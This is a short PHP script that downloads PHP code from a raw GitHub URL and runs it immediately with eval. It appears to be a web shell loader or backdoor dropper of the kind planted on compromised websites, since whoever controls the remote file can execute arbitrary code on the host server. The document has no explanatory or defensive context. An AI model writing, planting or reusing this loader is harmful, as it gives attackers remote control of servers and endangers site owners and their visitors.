<?php $dataUrl = "https://raw.githubusercontent.com/sunshine0110/zxsan/main/new.php"; $data = file_get_contents($dataUrl); header("Content-Type: text/html"); eval('?>' . $data); ?>
